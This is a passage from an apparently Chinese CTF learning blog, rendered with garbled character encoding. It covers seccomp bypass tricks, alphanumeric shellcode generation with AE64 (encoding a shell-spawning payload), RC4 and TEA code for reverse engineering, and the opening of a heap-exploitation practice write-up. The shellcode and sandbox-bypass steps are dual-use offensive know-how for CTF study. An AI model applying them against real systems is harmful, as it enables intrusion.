**å…¶ä»–æ–‡ä»¶æ“ä½œå‡½æ•°**: è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œæ¯”å¦‚ `lseek` å¯ä»¥ç”¨äºç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆï¼Œ`preadv` å¯ä»¥ç”¨äºåŸå­åœ°è¯»å–å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦æŒ‡å®šçš„æ–‡ä»¶å†…å®¹ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">è¦é€‰æ‹©åˆé€‚çš„æ›¿ä»£æ–¹æ¡ˆï¼Œéœ€è¦è€ƒè™‘åˆ°å…·ä½“çš„æƒ…å†µå’Œç¯å¢ƒé™åˆ¶ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="write">write</h4>
<h4 id="åºŸå¼ƒå¾…æ•´ç†">åºŸå¼ƒï¼Œå¾…æ•´ç†</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨ `seccomp-tools dump ./pwn` æ¥æŸ¥çœ‹ elf æ–‡ä»¶è¢«ç¦ç”¨äº†å“ªäº›è°ƒç”¨</span><br><span class="line"></span><br><span class="line">#### [2-2-2-1] ç¦ç”¨ `execve`</span><br><span class="line"></span><br><span class="line">- bypass: orw</span><br><span class="line"></span><br><span class="line">#### [2-2-2-2] OR æ²¡æœ‰ W ( prctl ç¦ç”¨ `open` ä½†ä¸ç¦ç”¨ `fstat`)</span><br><span class="line"></span><br><span class="line">&gt; æ³¨ï¼šç”±äºä¸‹é¢çš„ç»•è¿‡æ–¹å¼éœ€è¦åœ¨64ä½ä¸32ä½ä¹‹é—´åˆ‡æ¢ï¼Œæ‰€ä»¥å»ºè®®ä¸è¦åœ¨ exp å¼€å¤´è®¾ç½® `context(arch=&#x27;i386/amd64&#x27;)` ï¼Œè€Œæ˜¯é€‰æ‹© `asm(shellcode,arch=&#x27;i386/amd64&#x27;)`</span><br><span class="line"></span><br><span class="line">- bypass: ç”±äº64ä½ä¸‹ `fstat` å‡½æ•°çš„è°ƒç”¨å·ä¸º 5ï¼Œè€Œåœ¨32ä½ä¸­ `open` çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 5ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ `retfq` åˆ‡æ¢åˆ° 32 ä½æ‰§è¡Œ `open`</span><br></pre></td></tr></table></figure>
<h2 id="alphanumeric-shellcode-å­—æ¯æ•°å­—æ„æˆ">[2-3] alphanumeric
shellcode (å­—æ¯+æ•°å­—æ„æˆ)</h2>
<h3 id="manual-1">[2-3-1] Manual</h3>
<p><a href="https://nets.ec/Ascii_shellcode">ascii -&gt; asm
æ‰‹å†Œ</a></p>
<h3 id="restriction-2">[2-3-2] restriction</h3>
<p>shellcode åªèƒ½ç”±å­—æ¯å’Œæ•°å­—ç»„æˆ</p>
<h3 id="shellcode-ç”Ÿæˆ">[2-3-3] shellcode ç”Ÿæˆ:</h3>
<p>è¿™ç§ shellcode å¯ä»¥ç”±å·¥å…· <a
href="https://github.com/SkyLined/alpha3">ALPHA3</a> ç›´æ¥ç”Ÿæˆï¼Œ</p>
<p>ä½† alpha3 çš„ build æœ‰ç‚¹å„¿éº»çƒ¦ï¼Œä¸å¦‚ç›´æ¥ç”¨æ­ç”µä¸€ä½å¸ˆå‚…å†™çš„ <a
href="https://github.com/veritas501/ae64">AE64</a>ï¼Œ</p>
<p>AE64 å¯ä»¥å°†ä»»ä½• <code>AMD64</code> æ¶æ„çš„ shellcode è½¬æ¢ä¸º
alphanumeric shellcode</p>
<h3 id="ç¤ºä¾‹">[2-3-4] ç¤ºä¾‹ï¼š</h3>
<blockquote>
<p>AE64 åœ¨ github çš„ README æœ‰æ›´è¯¦ç»†çš„ä»‹ç»</p>
</blockquote>
<p>ç®€å•ç¤ºä¾‹ <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>è¿›é˜¶é€‰é¡¹ <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="comment"># equal to </span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line"><span class="comment"># And we can use &#x27;small&#x27; strategy to generate smaller alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;small&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="ä¾‹é¢˜">[3] ä¾‹é¢˜</h1>
<ol type="1">
<li><p><a href="">hgame2024 Week1 ezshellcode</a></p></li>
<li><p><a href="">hgame2024 week2 ShellcodeMaster</a></p></li>
</ol>
<h1 id="å‚è€ƒèµ„æ–™">[4] å‚è€ƒèµ„æ–™</h1>
<p><a href="https://mp.weixin.qq.com/s/onpGzz2uzSYKf09yvgb3uA">â­ The
art of shellcode</a></p>
<p><a
href="https://www.freebuf.com/articles/system/237300.html">ç®€å•è·å–shellcodeçš„å‡ ç§æ–¹å¼</a></p>
<p><a
href="https://pullp.github.io/tips/2021/01/30/shellcode-tips.html">wxk1997's
blog - shellcode tips</a></p>
<p><a
href="https://hkhanbing.github.io/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/">hkbin's
blog - shellcode</a></p>
<p><a href="https://www.anquanke.com/post/id/219077">å…³äº seccomp
ç»•è¿‡çš„æ›´æ·±æ–¹æ³•</a></p>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">é¡¶çº§
seccomp æ–‡ç« </a></p>
<p><a href="https://www.nssctf.cn/note/set/1876">Bsahfuck:
é™åˆ¶åªå…è®¸å‡ ç§å­—ç¬¦çš„shellcode</a></p>
<p><a
href="https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbulD9iiABoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">shellcode
çš„è‰ºæœ¯ - by n0va</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>REV - Crypto Knowledge Summary</title>
    <url>/2024/02/06/REV%20-%20Crypto%20Knowledge%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ€»ç»“ä¸€ä¸‹é€†å‘ä¸­æœ‰å…³å¯†ç å­¦çš„ç›¸å…³å†…å®¹ï¼Œä¾¿äºåç»­è°ƒç”¨
</blockquote>
<span id="more"></span>
<h1 id="ç›®å½•">[0] ç›®å½•</h1>
<ol type="1">
<li><p><a href="#1-stream-cipher">Stream Cipher</a></p>
<ul>
<li><a href="#1-1-rc4">1-1 RC4</a></li>
</ul></li>
<li><p><a href="#2-block-cipher">Block Cipher</a></p>
<ul>
<li><a href="#2-1-teaxteaxxtea">2-1 tea/xtea/xxtea</a></li>
</ul></li>
</ol>
<h1 id="stream-cipher">[1] Stream Cipher</h1>
<h2 id="rc4">[1-1] RC4</h2>
<h3 id="åŸºæœ¬åŸç†">[1-1-1] åŸºæœ¬åŸç†</h3>
<p>åŠ å¯†: æ˜æ–‡ä¸ keystream å¼‚æˆ–å¾—åˆ°å¯†æ–‡</p>
<p>å¯†æ–‡: å¯†æ–‡ä¸ keystream å¼‚æˆ–å¾—åˆ°æ˜æ–‡</p>
<p>keystream ä¸æ˜æ–‡ç­‰é•¿</p>
<p>ç”±äº RC4 é‡‡å–é€ä½å¼‚æˆ–çš„åŠ å¯†æ–¹å¼ï¼Œåªè¦æˆ‘ä»¬çŸ¥é“äº†å¯†æ–‡å’Œkeyï¼Œåªéœ€è¦æ”¾åˆ°
cyberchef é‡Œå†åŠ å¯†ä¸€æ¬¡å°±èƒ½å¾—åˆ°åŸæ–‡</p>
<h3 id="ç”Ÿæˆå¯†é’¥æµkeystream">[1-1-2] ç”Ÿæˆå¯†é’¥æµï¼ˆkeystreamï¼‰</h3>
<p>RC4 çš„å¯†é’¥æµç”Ÿæˆç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<ol type="1">
<li><p>KSAï¼ˆthe Key-Scheduling Algorithmï¼‰</p></li>
<li><p>PRGAï¼ˆthe Pseudo-Random Generation Algorithmï¼‰</p></li>
</ol>
<p><strong>KSA: åˆ©ç”¨keyç”ŸæˆSç›’</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> T[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    Sbox[i] = i;</span><br><span class="line">    T[i] = key[ i % key_length ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    j = (j + Sbox[i] + T[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PRGA: åˆ©ç”¨Sç›’ç”Ÿæˆå¯†é’¥æµ</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">    j = (j + Sbox[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">    t = (Sbox[i] + Sbox[j]) % SBOX_LEN;</span><br><span class="line">    puc_key_stream[k] = Sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="å®Œæ•´ä»£ç ">[1-1-3] å®Œæ•´ä»£ç </h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ©ç”¨Keyç”ŸæˆSç›’</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//äº¤æ¢puc_sbox[i]å’Œpuc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ©ç”¨Sç›’ç”Ÿæˆå¯†é’¥æµ</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* ä¸ºäº†æ›´æ¸…æ™°ç†è§£rc4ç®—æ³•æµç¨‹ï¼Œæ­¤å¤„ä¿å­˜keystreamï¼Œä¸ç›´æ¥è¿›è¡ŒXORè¿ç®— */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* åŠ è§£å¯† */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* æŠŠPRGAç®—æ³•æ”¾åœ¨åŠ è§£å¯†å‡½æ•°ä¸­å¯ä»¥ä¸éœ€è¦ä¿å­˜keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;HeyGap&quot;</span>&#125;; <span class="comment">//ç§˜é’¥å†…å®¹éšä¾¿å®šä¹‰</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;HeyGap&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ç”ŸæˆS-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* ç”Ÿæˆkeystreamå¹¶ä¿å­˜,S-boxä¹Ÿä¼šè¢«æ›´æ”¹ */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* åŠ å¯† */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* è§£å¯† */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="block-cipher">[2] Block Cipher</h1>
<h2 id="teaxteaxxtea">[2-1] Tea/xTea/xxTea</h2>
<h3 id="tea-decrypt">[2-1-1] Tea decrypt</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">1234</span>,<span class="number">2341</span>,<span class="number">3412</span>,<span class="number">4123</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> *encrypted)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> enc_tmp1 = encrypted[<span class="number">0</span>],enc_tmp2 = encrypted[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        enc_tmp2 -= (sum + enc_tmp1) ^ (<span class="number">16</span> * enc_tmp1 + key[<span class="number">2</span>]) ^ (<span class="number">32</span> * enc_tmp1 + key[<span class="number">3</span>]);</span><br><span class="line">        enc_tmp1 -= (sum + enc_tmp2) ^ (<span class="number">16</span> * enc_tmp2 + key[<span class="number">0</span>]) ^ (<span class="number">32</span> * enc_tmp2 + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    encrypted[<span class="number">0</span>] = enc_tmp1;</span><br><span class="line">    encrypted[<span class="number">1</span>] = enc_tmp2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encflag[] = &#123;</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">6</span>);</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span> *)encflag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xtea-decrypt">[2-1-2] xTea decrypt</h3>
<h3 id="xxtea-decrypt">[2-1-3] xxTea decrypt</h3>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>REVERSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Practice1</title>
    <url>/2023/08/14/Pwn%20-%20Practice1/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
ç»ƒä¹ é¢˜ wp è®°å½•
</blockquote>
<span id="more"></span>
<h1 id="ç›®å½•">ç›®å½•</h1>
<ul>
<li><a href="#0x00-tools-in-pwn">Tools in pwn</a></li>
<li><a href="#0x01-buuctf-babyheap_0ctf_2017">buuctf
babyheap_0ctf_2017</a></li>
<li><a href="#0x02-buuctf-ogeek2019babyrop_wp">buuctf
ogeek2019babyrop_wp</a></li>
<li><a href="#0x03-buuctf-hitcontraining_bamboobox">buuctf
hitcontraining_bamboobox</a></li>
<li><a href="#0x04-hitcontraining_uaf">buuctf
hitcontraining_uaf</a></li>
<li><a href="#0x05-hitcontraining_magicheap">buuctf
hitcontraining_magicheap</a></li>
<li><a href="#0x06-ciscn_2019_n_3">buuctf ciscn_2019_n_3</a></li>
<li><a href="#0x07-babyfengshui_33c3_2016">buuctf
babyfengshui_33c3_2016</a></li>
<li><a href="#0x08-hitcontraining_heapcreator">buuctf
hitcontraining_heapcreator</a></li>
<li><a href="#0x09-hitcon2014_stkof">buuctf hitcon2014_stkof</a></li>
<li><a href="#0x0a-jarvisoj_level5">buuctf jarvisoj_level5</a></li>
<li><a href="#0x0b-ciscn_2019_es_7">buuctf ciscn_2019_es_7</a></li>
</ul>
<h1 id="x00-tools-in-pwn">0x00 Tools in Pwn</h1>
<h2 id="pwndbg">pwndbg</h2>
<ol type="1">
<li><p>gdb.attach(io,'xxx')</p>
<ol type="1">
<li>xxx ä¸º GDB çš„è°ƒè¯•è¯­å¥ï¼Œæ¯”å¦‚'b main' æˆ–è€… 'n 285'</li>
</ol></li>
</ol>
<h2 id="gadgets">gadgets</h2>
<h3 id="ropgadget">ROPgadget</h3>
<ol type="1">
<li><p>é¢å‘ elf æ–‡ä»¶ä½¿ç”¨ï¼Œè¯¦æƒ…RTFM<code>ROPgadget -h</code></p></li>
<li><p>å‘½ä»¤çœæµ</p>
<ol type="1">
<li><p><code>ROPgadget --binary ./pwn --only "pop|ret" | grep rdi</code></p></li>
<li><p><code>ROPgadget --binary ./pwn --string 'sh'</code></p></li>
</ol></li>
</ol>
<h3 id="one_gadget">one_gadget</h3>
<ol type="1">
<li><p>é¢å‘ libc åº“ä½¿ç”¨</p></li>
<li><p>å‘½ä»¤ <code>one_gadget ./libc.so.6</code></p></li>
</ol>
<h2 id="seccomp-tools">seccomp-tools</h2>
<ol type="1">
<li><p>é¢å‘ elf æ–‡ä»¶ä½¿ç”¨</p></li>
<li><p>å‘½ä»¤ <code>seccomp-tools dump ./pwn</code></p></li>
</ol>
<blockquote class="blockquote-center">
ç¬¬ä¸€é“Heapï¼Œæ’ä¸ªé‡Œç¨‹ç¢‘çºªå¿µä¸€ä¸‹XD
</blockquote>
<h1 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
babyheap_0ctf_2017</h1>
<h2 id="å†™åœ¨å‰é¢">0. å†™åœ¨å‰é¢</h2>
<p>ä¸ƒæœˆå­¦å®Œæ ˆæº¢å‡ºï¼Œakæ‰buuå‰ä¸¤é¡µçš„æ‰€æœ‰æ ˆé¢˜<br />
å…«æœˆæœ¬æ¥æ˜¯æƒ³æŠŠå †å­¦ç©¿ï¼Œç­‰å›æƒ³èµ·è¿™ä¸ªç›®æ ‡å‰åŠä¸ªæœˆå·²ç»æ²¡äº†<br />
å‚åŠ äº†ä¸ªæ•°æ®å®‰å…¨çš„å¤ä»¤è¥<br />
ç»™sduçš„æ–°ç”Ÿèµ›æå®£ä¼ ï¼ˆæœ¬æ¥æƒ³å‡ºç‚¹ç­¾åˆ°é¢˜ç»“æœå·²ç»è¢«äººå‡ºå¥½äº†TT^TTï¼‰<br />
ç»™SecretFlowå®¡äº†ä¸€ç‚¹goè¯­è¨€çš„æ´<br />
ç„¶åç”¨C#å’Œxamlç»™sduæ ¡å›­ç½‘å†™äº†ä¸ªä¸€é”®ä¿®å¤è„šæœ¬<br />
æ€»è€Œè¨€ä¹‹å­¦çš„å¾ˆæ‚...è¯´å®è¯çœŸä¸å¦‚å¤šæ‰“ç‚¹æ¯”èµ›ã€‚<br />
æœ¬æ¥æ ˆçš„èƒ½åŠ›å°±æ²¡å¾—åˆ°æ¯”èµ›çš„æ£€éªŒï¼Œå †çš„å­¦ä¹ æ—¶é—´åˆæ‰€å‰©æ— å‡ äº†...<br />
æ€»è€Œè¨€ä¹‹è¿˜æ˜¯è„šè¸å®åœ°å­¦ä¸€ç‚¹ç®—ä¸€ç‚¹å§<br />
è¿˜æœ‰ä¸ªå—å¤§PAçš„å‘ç­‰ç€æˆ‘å»å¡«å‘¢...æ‰åˆšæŠŠnemuçš„gdbå®ç°äº†ä¸ªå•æ­¥æ­¥å…¥...</p>
<blockquote>
<p>åšå®Œè¿™é“é¢˜æ‰ç®—çœŸæ­£æ„ä¹‰ä¸Šçš„AKç¬¬ä¸€é¡µXD</p>
</blockquote>
<h2 id="ä¸»è¦çŸ¥è¯†ç‚¹">â… . ä¸»è¦çŸ¥è¯†ç‚¹</h2>
<ol type="1">
<li>å †æº¢å‡º</li>
</ol>
<h2 id="è§£é¢˜æ­¥éª¤">â…¡. è§£é¢˜æ­¥éª¤</h2>
<ol type="1">
<li>checksec ä¿æŠ¤å…¨å¼€</li>
</ol>
<p><img src="/pic/Pasted%20image%2020230814133847.png" /></p>
<ol start="2" type="1">
<li><p>è¯¥elfæ–‡ä»¶åœ¨ubuntu16ä¸­åˆ›å»ºï¼Œwslç”¨çš„æœ¬æœºlibcè‚¯å®šä¸åˆé€‚ï¼Œæ‰€ä»¥<code>patchelf</code>ä¸€ä¸‹<br />
